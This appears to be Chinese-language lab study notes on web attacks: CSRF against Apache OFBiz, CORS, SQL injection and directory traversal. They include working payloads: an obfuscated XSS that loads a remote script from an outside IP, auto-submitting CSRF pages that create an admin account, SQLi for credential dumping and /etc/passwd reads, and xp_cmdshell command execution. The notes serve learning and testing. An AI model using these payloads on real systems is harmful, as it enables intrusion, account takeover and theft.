接下來可以透過這個 request 使用 `Fetch()` 或 `XMLHttpRequest()` 發送 POST\
但 POST 請求包含一個 `customerId=200` 參數，必須要從目標使用者中提取該參數，先嘗試使用 Repeater 發送 customerId 值為空\
![image](https://hackmd.io/_uploads/Bk9SWlbLWx.png)
> 看起來 customerId 為空也不影響 XD

編寫 JavaScript  fetch() 發送請求: (fetchCookie.js)
```
fetch('http://shopizer:8080/shop/customer/updateAddress.html',{
  method: 'POST',
  mode: 'same-origin',
  credentials: 'same-origin',
  headers: {
    'Content-Type':'application/x-www-form-urlencoded'
  }, 
  body:'customerId=&billingAddress=false&firstName=CHW&lastName=41&company=&address=address&city=city&country=AL&stateProvince=TW&postalCode=55688&phone=0909&submitAddress=Change+address'
})
```
> - `mode: 'same-origin'`: 代表不是跨站請求，是同一個網站。這讓瀏覽器不啟動 CORS 防禦
> - `credentials: 'same-origin'`: 將 cookie 一起送出

![image](https://hackmd.io/_uploads/rJzw3bWUZx.png)

建構腳本後，利用前一章節的弱點 (Handbags XSS)
```
'+btoa(eval(atob('alF1ZXJ5LmdldFNjcmlwdCgnaHR0cDovLzE5Mi4xNjguNDUuMjM3L2ZldGNoQ29va2llLmpzJyk=')))+'
```
![image](https://hackmd.io/_uploads/BkZzzzbUWx.png)
![image](https://hackmd.io/_uploads/B12eMM-Ibg.png)
> 成功觸發，更改 Address


```
[1] 攻擊者送 URL（ref XSS payload）
     ↓
[2] 受害者打開 URL
     ↓
[3] payload 注入並執行於 shopizer JS context
     ↓
[4] payload 載入外部 xss.js
     ↓
[5] xss.js 執行 fetch()
     ↓
[6] 瀏覽器自動附帶 JSESSIONID
     ↓
[7] shopizer 接受 request
     ↓
[8] 受害者帳號資料被改

```

# Cross-Origin Attacks
過去的 Web application 通常是 [Monolithic Architecture](https://microservices.io/patterns/monolithic.html)，所有資料、資源和內容都位於單一網域中\
許多 Web application 會從多個網域載入資料和資源，可能會跨網域請求

- [Same Origin Policy (SOP)](https://en.wikipedia.org/wiki/Same-origin_policy)
- [Cross-Site Request Forgery (CSRF)](https://en.wikipedia.org/wiki/Cross-site_request_forgery)
- [Cross-Origin Resources Sharing (CORS)](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing)

## Same-Origin Policy
Origin = scheme + host + port

### Introduction to the Same-Origin Policy
Origin = protocol + hostname + port number\
URL | Origin |
:------|:---------------------|
https://fbi.com  |    https + fbi.com + 443    | 
http://fbi.com |    ❌ 不同 protocol    |
https://fbi.com:8443 |    ❌ 不同 port    |
https://dev.fbi.com |    ❌ 不同 hostname   |

Same-Origin Policy（SOP）允許將 images、IFrame 和其他資源載入到頁面上，同時阻止 JavaScript 引擎存取回應的內容

以下是一個 使用 Fetch API 的 application 可以發送 GET 請求
![image](https://hackmd.io/_uploads/ryQpppWLWg.png)
> Request failed

從 Broswer console 可以得知：\
![image](https://hackmd.io/_uploads/rJy-CaWUWg.png)
> Cross-Origin Request Blocked\
> Same Origin Policy disallows `reading` the remote resource
>> JS 被禁止讀 response

嘗試載入一張圖片。SOP 允許跨域載入圖片，但僅適用於 HTML 中的圖片標籤。如果我們嘗試使用 JavaScript 跨網域載入圖片，SOP 應該會阻止 JavaScript 存取回應

SOP 會阻止 JavaScript 存取跨網域請求的回應，但請求本身仍然會被傳送。在某些情況下，CORS 可以用來選擇性地放寬 SOP 的限制，例如嵌入圖片

![image](https://hackmd.io/_uploads/S11ciyMIbg.png)

## SameSite Cookies
>[!Note]
>SOP 擋的是讀 response; SameSite 擋的是送 cookie

Google Chrome 在 2016 推出 [SameSite](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie#samesitesamesite-value) attribute 主要在處理 cross-site 和 cross-origin 的 Cookie
- SameSite=None : 任何情況都送 cookie
- SameSite=Lax (Chrome 預設)： 送 cookie 給 User 主動導覽，不送背景跨站請求
- SameSite=Strict：只要不是同一個 site，cookie 就不送

## Cross-Site Request Forgery (CSRF)
CSRF 曾是 [OWASP Top 10](https://owasp.org/www-project-top-ten/) 的重要漏洞，但由於 Broswer 實施了新的防禦措施，以及許多框架都新增 CSRF 保護。因此在 2017 年的版本後被移除。

CSRF 漏洞最危險的點在於任何被訪問的網站都可以發起請求：\
用戶已通過身份驗證，並且 Broswer 會將 cookie 發送到目標 application。攻擊者可利用釣魚鎖定特定用戶，或入侵網站，對所有造訪該網站的用戶發動 CSRF。

>[!Note]
> CSRF 成立條件:
> 1. 使用者已登入目標網站
→ 瀏覽器裡有 有效 session cookie
> 2. 攻擊者能讓瀏覽器送出 request
→ `<form>`、`<img>`、`<iframe>`、`fetch`、自動 redirect
> 3. 目標請求 只靠 cookie 辨識使用者
> → 沒有 CSRF token / 沒有二次驗證

### Detecting and Preventing CSRF
CSRF token cookie 運作機制：
1. Server 設 cookie: `Set-Cookie: csrf=RANDOM`
2. JS 讀 cookie: `document.cookie`
3. JS 主動送 header: `X-CSRF: RANDOM`
4. Server 檢查: `cookie == header ? OK : reject`

若存在 XSS 漏洞可繞過 CSRF 保護機制，因為 XSS 的請求都被視為網域的一部分

- 沒有 CSRF protection 的表單範例：
```html
<form action="/user/changePassword" method="post">
    <div class="form-group">
        <label for="password1">Password</label>
        <input type="password" class="form-control" id="password1" name="password1" required>
    </div>
    <div class="form-group">
        <label for="password2">Repeat Password</label>
        <input type="password" class="form-control" id="password2" name="password2" required>
    </div>
    <button type="submit" class="btn btn-primary">Submit</button>
</form>
```

以上表單若攻擊者利用瀏覽器自動帶 cookie 的特性，存在以下請求密碼就被竄改了
```html
<form action="https://victim.com/user/changePassword" method="POST">
  <input name="password1" value="hacked123">
  <input name="password2" value="hacked123">
</form>

<script>
  document.forms[0].submit();
</script>
```

- 包含 CSRF protection 的表單範例：
```html
<form action="/user/changePassword" method="post">
    <div class="form-group">
        <input type="hidden" name="csrftoken" value="SXQncyBhIHNlY3JldCB0byBldmVyeWJvZHkh" />
        <label for="password1">Password</label>
        <input type="password" class="form-control" id="password1" name="password1" required >
    </div>
    <div class="form-group">
        <label for="password2">Repeat Password</label>
        <input type="password" class="form-control" id="password2" name="password2" required>
    </div>
    <button type="submit" class="btn btn-primary">Submit</button>
</form>
```
表單現在包含一個 csrftoken 的隱藏輸入欄位， Web appplication 可透過這個 value 來判斷使用者是否主動提交請求。

### Exploiting CSRF
有多種方法可以讓 Broswer 發送 GET 請求 (POST 相較 GET 較難達到):
- `<img>`：載圖片是 GET
- `<iframe>`：載入頁面也是 GET
- `<link>`：載 CSS 也是 GET
- `<script src=...>`：載 JS 也是 GET

🎯 Requesst 送到目標，且附帶了受害者的 cookie

## Case Study: Apache OFBiz
分析開源 ERP application[ Apache OFBiz](https://ofbiz.apache.org/) 的 CSRF 漏洞

### Apache OFBiz - Discovery
![image](https://hackmd.io/_uploads/rJMAIfzLZl.png)

可以看到 Server 設定包含兩個 cookie，但都不是 CSRF token、也沒有 設定 SameSite attribute\
![image](https://hackmd.io/_uploads/By7L0MMI-g.png)

CSRF 有效目標就是狀態改變的管理功能
- 建立新使用者
![image](https://hackmd.io/_uploads/HkUiOVML-l.png)
![image](https://hackmd.io/_uploads/ryH_OSM8bg.png)
```
POST /webtools/control/createUserLogin HTTP/1.1
Host: ofbiz:8443
Cookie: JSESSIONID=5A1AB30006F163300FB3C41E8A1EA181.jvm1; OFBiz.Visitor=10000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://ofbiz:8443/webtools/control/createUserLogin
Content-Type: application/x-www-form-urlencoded
Content-Length: 180
Origin: https://ofbiz:8443
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

enabled=&partyId=&userLoginId=UserID&currentPassword=UserPASS&currentPasswordVerify=UserPASS&passwordHint=&requirePasswordChange=N&externalAuthId=&securityQuestion=&securityAnswer=
```

- 指派角色/群組
![image](https://hackmd.io/_uploads/rJiA_SMLZx.png)
![image](https://hackmd.io/_uploads/HyJ0uHzI-g.png)
```
POST /webtools/control/addUserLoginToSecurityGroup HTTP/1.1
Host: ofbiz:8443
Cookie: JSESSIONID=5A1AB30006F163300FB3C41E8A1EA181.jvm1; OFBiz.Visitor=10000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://ofbiz:8443/webtools/control/EditSecurityGroupUserLogins?groupId=SUPER
Content-Type: application/x-www-form-urlencoded
Content-Length: 82
Origin: https://ofbiz:8443
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

groupId=SUPER&userLoginId=UserID&fromDate_i18n=&fromDate=&thruDate_i18n=&thruDate=
```

以上兩個 POST Request 中都不包含 CSRF token

### Apache OFBiz - Exploitation
建立 HTML 頁面，利用 CSRF 漏洞新增使用者\
在`/var/www/html` 目錄下建立 `ofbiz.html` 表單，且在表單元素內新增輸入元素

```
<html>
<body onload="document.forms['csrf'].submit()">

  <form action="https://ofbiz:8443/webtools/control/createUserLogin"
        method="post"
        name="csrf">

    <input type="hidden" name="enabled">
    <input type="hidden" name="partyId">

    <input type="hidden" name="userLoginId" value="csrftest">
    <input type="hidden" name="currentPassword" value="password">
    <input type="hidden" name="currentPasswordVerify" value="password">

    <input type="hidden" name="passwordHint">
    <input type="hidden" name="requirePasswordChange" value="N">
    <input type="hidden" name="externalAuthId">
    <input type="hidden" name="securityQuestion">
    <input type="hidden" name="securityAnswer">

  </form>

</body>
</html>
```
執行 Apache
```
sudo systemctl restart apache2
```
在瀏覽器開啟一個新分頁，並瀏覽 CSRF 頁面\
點擊後表單會自動提交並跳轉到 Update User Login Security Settings 頁面
![image](https://hackmd.io/_uploads/HycfazQIWl.png)
![image](https://hackmd.io/_uploads/SJrXpG7UZe.png)
> 成功創建新用戶


接著新增一個表單用於將使用者新增至 SUPER 群組
```
<html>
<body onload="document.forms['csrf'].submit()">

  <form action="https://ofbiz:8443/webtools/control/userLogin_addUserLoginToSecurityGroup" method="post" name="csrf2" target="_blank">
    <input type="hidden" name="userLoginId" value="csrftest">
    <input type="hidden" name="partyId">
    <input type="hidden" name="groupId" value="SUPER">
    <input type="hidden" name="fromDate_i18n">
    <input type="hidden" name="fromDate">
    <input type="hidden" name="thruDate_i18n">
    <input type="hidden" name="thruDate">
</form>

</body>
</html>
```

接著建立 JavaScript 函數提交表單，且確保表單 1 送出後才送表單 2
```
<html>
<head>
<script>
  function submitForms() {
    document.forms['csrf'].submit();
    document.forms['csrf2'].submit();
    return false;
  }
</script>
</head>
<body onload="submitForms();" >
...
```

![image](https://hackmd.io/_uploads/H1vlzIX8Zl.png)
> 攻擊成功

### Revising the CSRF Payload
以上是使用兩種表單提交來達成，可直接使用 JavaScript 發出請求，不需將瀏覽器導航離開我有效負載頁面。我們將在 /var/www/html 目錄下建立一個新的 HTML 頁面

```html
<html>
<head>
<script>
  var username = "csrftest2";
  var password = "password";
  var host = "https://ofbiz:8443";
  var create_url = "/webtools/control/createUserLogin";
  var admin_url = "/webtools/control/userLogin_addUserLoginToSecurityGroup";
  
  var create_params = "enabled=&partyId=&userLoginId=" + username + "&currentPassword=" + password + "&currentPasswordVerify=" + password + "&passwordHint=hint&requirePasswordChange=N&externalAuthId=&securityQuestion=&securityAnswer=";
  
  var admin_params = "userLoginId=" + username + "&partyId=&groupId=SUPER&fromDate_i18n=&fromDate=&thruDate_i18n=&thruDate=";

  function send_create() { 
    console.log("Creating user..."); 
    fetch(host + create_url, {
      method: 'POST',
      mode: 'no-cors',
      credentials: 'include',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body : create_params }
    ).then(function(response) {
      send_admin();
    }); 
  }

  function send_admin() { 
    console.log("Adding admin role..."); 
    fetch(host + admin_url, {
      method: 'POST',
      mode: 'no-cors',
      credentials: 'include',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded' 
      },
      body : admin_params }
    ).then(
      console.log("Should be done...") 
    );
  }

  send_create();
</script>
</head>
<body></body>
</html>
```
>  Fetch API 以「no-cors」 mode 發送 POST 請求。這限制了我們只能使用「application/x-www-form-urlencoded」作為 Content Type

## Cross-Origin Resource Sharing (CORS)
CORS 透過 Request headers 指示瀏覽器哪些來源可以存取伺服器資源\
有意放寬 SOP 限制。如果配置錯誤，攻擊者可以利用 CORS 透過客戶端攻擊在 user's session 執行操作，原理與 CSRF 類似

### Anatomy of the CORS Request
在傳送實際的跨網域請求之前，瀏覽器會使用 OPTIONS HTTP method 向目標網域發出 preflight request ，以確定請求網域是否可以執行所要求的操作

所有跨域請求都包括 preflight request 和 Origin header\
Sample preflight request
```
OPTIONS /foo HTTP/1.1
Host: megacorpone.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Connection: keep-alive
Origin: https://offensive-security.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: X-UserId
```
- `Origin`: 誰在發 request
- `Access-Control-Request-Method`: 等等要用的 HTTP method
- `Access-Control-Request-Headers`: 等等會帶的 非預設 header

### Response Headers
```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Wed, 23 Jun 2021 17:38:47 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 0
Connection: close
Access-Control-Allow-Methods: GET, POST, OPTIONS
Access-Control-Allow-Origin: https://offensive-security.com
Access-Control-Allow-Credentials: true
Access-Control-Allow-Headers: X-UserId
```
- `Access-Control-Allow-Origin`: 只有這個 origin 的 JS，可以讀 response
- `Access-Control-Allow-Credentials`: 瀏覽器可以帶 cookie / Authorization header
- `Access-Control-Allow-Methods`: 允許跨站用哪些 HTTP method
- `Access-Control-Allow-Headers`: 允許跨站 request 用哪些 自訂 header

## Exploiting Weak CORS Policies



# Introduction to SQL
> SQL, MySQL, MSSQL, PostgreSSQL, Oracle

## Basic SQL Syntax
- SQL_syntax: https://en.wikipedia.org/wiki/SQL_syntax ↩︎
- Table_(database): https://en.wikipedia.org/wiki/Table_(database) ↩︎
- Column_(database): https://en.wikipedia.org/wiki/Column_(database) ↩︎
- Row_(database): https://en.wikipedia.org/wiki/Row_(database) ↩︎
- SQL: https://en.wikipedia.org/wiki/SQL ↩︎
- Database_schema: https://en.wikipedia.org/wiki/Database_schema

## Manual Database Enumeration

Structured Query Language (SQL)
- 詳細內容可參考： [Web 滲透筆記](https://hackmd.io/@CHW/ByenX6HRll#SQLi-%E5%88%86%E9%A1%9E)

## Enumerating MySQL Databases
 MySQL commands ( 其中 MariaDB 也是 MySQL 的一個開源分支)
- version()
```sql
mysql> select version();
+-----------+
| version() |
+-----------+
| 5.7.28    |
+-----------+
1 row in set (0.00 sec)
```
- current_user() or system_user() : 目前連線到 DB 的使用者帳戶
```sql
mysql> select current_user();
+----------------+
| current_user() |
+----------------+
| user@%         |
+----------------+
1 row in set (0.00 sec)
```
- 查詢 information_schema 中的 tables
```sql
mysql> select table_schema from information_schema.tables group by table_schema;
+--------------------+
| table_schema       |
+--------------------+
| information_schema |
| app                |
| exercise           |
| mysql              |
| performance_schema |
| sqlmap             |
| sys                |
+--------------------+
7 rows in set (0.00 sec)

mysql> select table_name from information_schema.tables where table_schema = 'app';
+------------+
| table_name |
+------------+
| flags      |
| menu       |
| users      |
+------------+
3 rows in set (0.00 sec)

mysql> select column_name, data_type from information_schema.columns where table_schema = 'app' and table_name = 'menu';
+-------------+-----------+
| column_name | data_type |
+-------------+-----------+
| id          | int       |
| name        | varchar   |
| description | varchar   |
| price       | decimal   |
+-------------+-----------+
4 rows in set (0.00 sec)
```

![image](https://hackmd.io/_uploads/H13ON9X8Wx.png)


## Enumerating Microsoft SQL Server Databases
- @@version
```sql
1> select @@version;

2> GO
 
-------------------------------------------------------------------------
Microsoft SQL Server 2019 (RTM-CU11) (KB5003249) - 15.0 (X64) 
	May 27 2021 17:34:14 
	Copyright (C) 2019 Microsoft Corporation
	Express Edition (64-bit) on Linux (Ubuntu 18.04.5 LTS) <X64>  
(1 rows affected)
```
- SYSTEM_USER : 目前連線到 DB 的使用者帳戶
```sql
1> SELECT SYSTEM_USER;

2> GO

-------------------------------------------------------------------------
sa                  
(1 rows affected)
```
> `sa` 是 SQL Server 中管理員等級帳戶的預設名稱

- 查詢 information_schema 中的 tables
```sql
1> SELECT name FROM sys.databases;

2> GO
name                                                                                          
-------------------------------------------------------------------------
master
tempdb
model
msdb
app

sqlmap  
(7 rows affected)

1> select * from app.information_schema.tables;

2> GO
TABLE_CATALOG    TABLE_SCHEMA   TABLE_NAME       TABLE_TYPE
------------------------------------------------------------
app              dbo            menu              BASE TABLE
app              dbo            users             BASE TABLE
app              dbo            flags             BASE TABLE

(3 rows affected)

1> select COLUMN_NAME, DATA_TYPE from app.information_schema.columns where TABLE_NAME = 'menu';

2> GO
COLUMN_NAME    DATA_TYPE                         
------------------------------------------------------------
id             int
name           varchar
description    varchar
price          decimal        

(4 rows affected)

1> SELECT * FROM app.dbo.secretTable;
```

## Enumerating PostgreSQL Databases
- version()
```sql
user=# select version();
                                 version
---------------------------------------------------------------------------
 PostgreSQL 13 on x86_64-pc-linux-musl, compiled by gcc (Alpine 10.3.1_git20210424) 10.3.1 20210424, 64-bit
(1 row)
```

- current_user : 目前連線到 DB 的使用者帳戶
```sql
user=# select current_user;
 current_user 
--------------
 user
(1 row)
```
- 查詢 information_schema 中的 tables
```sql
user=# select datname from pg_database;
  datname  
-----------
 postgres
 user
 template1
 template0
 app
 exercise
 sqlmap
(7 rows)

app=# select table_name from app.information_schema.tables where table_schema = 'public';
 table_name 
------------
 menu
 users
 flags
(3 rows)

app=# select column_name, data_type from app.information_schema.columns where table_name = 'menu';
 column_name |     data_type     
-------------+-------------------
 id          | integer
 price       | numeric
 name        | character varying
 description | character varying
(4 rows)

app=# SELECT * FROM public.topsecret;
```
## Enumerating Oracle Databases
- v$version
```sql
SQL> select * from v$version;

BANNER
--------------------------------------------------------------------------------
Oracle Database 11g Express Edition Release 11.2 - 64bit Production
PL/SQL Release 11.2 - Production
CORE	11.2 Production
TNS for Linux: Version 11.2 - Production
NLSRTL Version 11.2 - Production

SQL
```

- DUAL : 目前連線到 DB 的使用者帳戶
```sql
SQL> select user from dual;

USER
------------------------------
SYSTEM
```
- 查詢 tables
Oracle databases create a schema for each user\
可以透過 all_tables 開始查詢
```sql
SQL> select owner from all_tables group by owner;

OWNER
------------------------------
MDSYS
OUTLN
CTXSYS
HR
FLOWS_FILES
SQLMAP
SYSTEM
APEX_040000
XDB
SYS

10 rows selected.

SQL> select table_name from all_tables where owner = 'SYS' order by table_name;

TABLE_NAME
------------------------------
ACCESS$
ALERT_QT
APPLY$_CHANGE_HANDLERS
APPLY$_CONF_HDLR_COLUMNS
APPLY$_CONSTRAINT_COLUMNS
APPLY$_DEST_OBJ
APPLY$_DEST_OBJ_CMAP
...
MAP_SUBELEMENT$
MENU
METAFILTER$
...
939 rows selected.

SQL> select column_name, data_type from all_tab_columns where table_name = 'MENU';

COLUMN_NAME        DATA_TYPE
-----------------------------------------
ID                 NUMBER
NAME               VARCHAR2
DESCRIPTION        VARCHAR2
PRICE              NUMBER
```

# SQL Injection
## Introduction to SQL Injection
### What is SQL Injection?
[SQL Injection](https://en.wikipedia.org/wiki/SQL_injection) 是一種常見的網路應用程式漏洞，當未經過濾的使用者輸入被插入到 [queries](https://en.wikipedia.org/wiki/SQL) 中，並傳遞給資料庫執行時，就會發生 SQL 注入攻擊

假設一個 application 正在執行類似`SELECT * FROM menu WHERE id = 10;` 的查詢，若提交的不是 `10`，而是 `10 or id=11`
```sql
SELECT * FROM menu WHERE id = 10 or id = 11;
```
可能會 dump 出 id 為 10 或 11 的所有記錄

攻擊者可以利用 SQL 注入漏洞繞過應用程式邏輯（例如登入檢查）、竊取或修改資料、在資料庫伺服器上寫入文件，或執行遠端程式碼

## Testing for SQL Injection
判斷 User input 是否直接被拼進 SQL queries，有些 applications 可能會有錯誤配置，導致 DB return verbose error messages
### String Delimiters
>[!Tip]
>使用單引號 `'` 作為字串分隔符號

假設有一個 SQL statement，用於從 menu 的 TTable 中選擇所有名為「Tostadas」的欄位，透過以下查詢：
```sql
SELECT * FROM menu WHERE name = 'Tostadas'
```
控制 WHERE clause 的輸入，嘗試提交值
```sql
SELECT * FROM menu WHERE name = 'Tostadas''
```
會造成單引號數量不平衡。第一個單引號標記 string value 開始、第二個單引號標記 string value 結束、第三個單引號標記 new string 的開始，因此在解析時會有錯誤\
若遇到應用程式在引入引號時拋出 SQL error，可以注入更多 SQL constraints 並提取資料

### Closing Out Strings and Functions
由於在 SQL 中是 case-sensitive，可能會遇到兩個常見的函數：
- `UPPER()`: 文字轉換為大寫
- `LOWER()`: 文字轉換為小寫

開發人員會使用這些函數來確保被比較的字串大小寫一致
```sql
SELECT * FROM menu WHERE LOWER(name) = LOWER('input_here')
```

在 SQLi 不僅需要用單引號閉合，還需要用 `)` 閉合 function call
- 若沒有閉合: \
`foo' OR id=11` 👉🏻 `LOWER('foo') OR id=11')`
- comment 閉合: \
`foo') OR id=11-- ` 👉🏻 `WHERE LOWER(name) = LOWER('foo') OR id=11-- ')`

另一個場景：查詢部分字串比對，ex.「taco」=「tacos」\
可以透過使用 LIKE operator
```sql
SELECT * FROM menu WHERE LOWER(name) LIKE LOWER('%input_here%')
```
可利用 `-- -` 或 `-- %` 做閉合：\
`SELECT * FROM menu WHERE LOWER(name) LIKE LOWER('%foo') or id=11-- %')`

### Sorting
ORDER BY 可以被利用: 測 SQLi、計算有幾個欄位

`sort`、`order`、`asc` 和 `desc`等常被用作 SQL 查詢中的參數，用於對結果進行排序

可以利用 `ASC` 或 `DESC` 分別指定升序或降序排列
>[!Tip]
>大多數資料庫在查詢包含 `ORDER BY`且未指定 ASC 或 DESC 時，預設使用升序排列

[Boundary testing](https://en.wikipedia.org/wiki/Boundary-value_analysis)，當我們遇到似乎只接受 limited data set 時，可以測試提交超出該資料集範圍的值，以確定應用程式的回應。

Ex.可利用 `ORDER BY 4 desc` 測試資料庫欄位數量，直到 Boundary 即可確定實際數量

### Fuzzing
使用 wfuzz 進行測試:\
瀏覽 http://sql-sandbox/discovery/fuzzing \
![image](https://hackmd.io/_uploads/Sy5pT2N8We.png)

截取 Request ，定義 wfuzz 標的與 FUZZ 的參數
```
wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -d "db=mysql&name=chw&sort=id&order=FUZZ" -u http://sql-sandbox/discovery/api/fuzzing 
```
![image](https://hackmd.io/_uploads/Hys9k648Wl.png)

可再透過 Response 500 查看是否有 error message 洩漏訊息 ; Response 200 的 Payload 可進一步測試

## Exploiting SQL Injection
一旦識別出可能觸發 SQLi 的參數或輸入字段，下一步開始編寫有效 Payload\

若能夠注入 SQL 查詢程式碼，但卻無法取得查詢結果 👉🏻 [blind SQL injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection)

### Error-based Payloads
想辦法讓 DB 把資料印在錯誤訊息裡
>[!Important]
> SQL Injection Wiki: \
> https://sqlwiki.netspi.com/injectionTypes/errorBased/#mysql 

1. Database software version: [cast()](https://learn.microsoft.com/en-us/sql/t-sql/functions/cast-and-convert-transact-sql?view=sql-server-ver15)
    - MSSQL: `cast(@@version as int)`
    - PostgreSQL: `cast(version() as int)`
    - MySQL: `cast(version() as int)`, `extractvalue('',concat('>',version()))`
    - Oracle: 
``` 
to_char(
  dbms_xmlgen.getxml(
    'select "'||
    (select substr(banner,0,30) from v$version where rownum=1)
    ||'" from sys.dual'
  )
)     
```

>[!Tip]
> Oracle 與 PostgreSQL 皆可使用 double pipes (`||`) 拼接字串

2. Error messages: Ex. Oracle error: `ORA` 


### UNION-based Payloads
使用 [UNION](https://learn.microsoft.com/en-us/sql/t-sql/language-elements/set-operators-union-transact-sql?view=sql-server-ver15) keyword 可以合併並傳回兩個以上查詢的結果。大多資料庫軟體會要求 queries 查詢的數量與 data types 需要與 columns 相同

正常 UNION SELECT 查詢：
```
SELECT id, name, description, price FROM menu UNION ALL SELECT id, username, password, 1 FROM users;
```
![image](https://hackmd.io/_uploads/S1kaKRSUbl.png)

SQLi UNION SELECT: (查詢 username, password)
```
SELECT id, name, description, price FROM menu WHERE id = 0 UNION ALL SELECT id, username, password, 0 from users
```
![image](https://hackmd.io/_uploads/Byor9CBIbg.png)
> `tom.jones`:`notunusual`


### Stacked Queries
有些 DB 可以同時執行多個查詢，這些查詢稱為 Stacked Queries\
概念上與 UNION 類似，但 Stacked Queries 是指同時提交的多個獨立查詢指令

>[!Tip]
>PostgreSQL + driver 預設允許 multi-statement

嘗試在第二個 statement 注入資料
```
10; insert into users(id, username, password) values (1001,'hax','hax');
```
![image](https://hackmd.io/_uploads/r1lAnkILWl.png)
> did not return any rows of data\
> 可能代表資料已成功注入

檢視資料庫：\
![image](https://hackmd.io/_uploads/BJSaaJIU-x.png)


### Reading and Writing Files
在某些 DB 可以從 underlying server 讀取檔案或寫入檔案\
可以利用這些功能從伺服器竊取資料或寫入文件 Ex. 建立 webshell 進而發動其他攻擊

PostgreSQL 可以利用 COPY 讀寫本機檔案：使用 `COPY FROM` 可以將檔案 insert 資料到 table 中，或使用 `COPY TO` 將資料從表格複製到檔案

我們可以在 http://sql-sandbox/sqlconsole 的
沙盒應用程式中進行練習。我們將選擇「PostgreSQL」作為資料庫，並在下面的「查詢」欄位中輸​​入一個利用堆疊查詢的有效負載（如清單 16 所示）。

#### 1. COPY FROM / COPY TO [PostgreSQL]
- COPY FROM（讀檔 → DB）
把 OS 檔案內容讀進資料表
```
COPY table_name FROM '/path/to/file';
```
- COPY TO（DB → 寫檔）
把 table 內容寫成檔案，常被拿來寫 webshell
```
COPY table_name TO '/path/to/file';
```

環境範例：
```
create table tmp(data text);
copy tmp from '/etc/passwd';
select * from tmp;
```
![image](https://hackmd.io/_uploads/rJpCBZLIbg.png)

#### 2. pg_read_file() [PostgreSQL]
`pg_read_file() ` 不會將結果 insert 進 table
```
SELECT pg_read_file('/etc/passwd');
```
![image](https://hackmd.io/_uploads/rkANuZLI-l.png)

`g_read_file()` 傳回文件為單一欄位。如果要在 Union-based 使用，需要包含靜態值以符合原始查詢中的列數

#### 3. secure_file_priv [MySQL]
>[!Note]
>MySQL 有個 `secure_file_priv` 的
系統變量，用於限制哪些目錄可以讀寫檔案

查詢路徑權限：
```
SELECT @@GLOBAL.secure_file_priv;
```
![image](https://hackmd.io/_uploads/ByGEYbI8bg.png)
> 只能讀取寫入`/var/lib/mysql-files` 目錄下的檔案

#### 4. LOAD_FILE() 讀檔 [MySQL]

```
SELECT LOAD_FILE('/etc/passwd')
```

#### 5. INTO OUTFILE 寫檔 [MySQL]
```
SELECT * FROM users
INTO OUTFILE '/var/lib/mysql-files/test.txt';
```
寫檔不會有任何回傳，但不報錯 ≠ 成功\
可以再透過 `LOAD_FILE()` 確認

![image](https://hackmd.io/_uploads/rk35iW8U-e.png)
![image](https://hackmd.io/_uploads/HJY3jWULZl.png)

### Remote Code Execution
如果資料庫可以幫你執行 OS 指令，那 SQL Injection 就升級成 RCE\
在 Microsoft SQL Server 中，[xp_cmdshell](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) function 可以接收字串並傳遞給 shell 執行

```
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1;  
GO  
-- To update the currently configured value for advanced options.  
RECONFIGURE;  
GO  
-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1;  
GO  
-- To update the currently configured value for this feature.  
RECONFIGURE;  
GO
```
啟用 xp_cmdshell 後，透過 function + command
```
EXECUTE xp_cmdshell 'whoami';
```

P.S Linux 版本的 SQL Server 不支援 `xp_cmdshell`

## Database dumping with Automated Tools
SQLMAP: https://sqlmap.org/

# Directory Traversal Attacks
輸入過濾不完善，Web applications 中可能出現 Directory Traversal 漏洞。攻擊者可能能夠篡改檔案路徑，從而遍歷到非預期目錄，竊取敏感資料

## Directory Traversal Overview
- Linux: 
    - `../`, `../../../`
    - Path: `/etc/passwd`
- Windows: 
    - `../`=`..\\`
    - Path:  `C:\Windows\win.ini`

例如：`curl -v http://www.megacorpone.com/about.html/../index.html -o megacorp.txt `

- URL-encode: 
    - `../` > `..%2F`
    - `%20` > ` `
    - `%3D` > `=`

```
GET /files/..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1 
```
可以透過 `../../../`
解析為直接重新導向回「`/webApp/login`

## Understanding Suggestive Parameters
Suggestive Parameter 透過參數名稱去猜測後端的訊息

例如：
```
GET /search/Hello%20World! HTTP/1.1
```
search: 後端在查資料，可能是 DB query, flat-file search, index lookup 等等

```
GET /admin/dashboard/manage/handler.aspx?file=ourFile.jpeg HTTP/1.1
```
Suggestive parameter（file）。這個 file parameter 可以猜測後端在負責文件處理或資料處理，可以進一步檢查是否有輸入過濾不完善的情況

```
?file=
?f=
/file/someFile 👉 Path traversal

?location=
?l=
/location/someLocation 👉 很可能是資料夾 / 路徑

search=
s=
/search/someSearch 👉 SQLi / LFI

?data=
?d=
/data/someData 👉 不一定是檔案，但可能會轉成檔案路徑

?download=
?d=
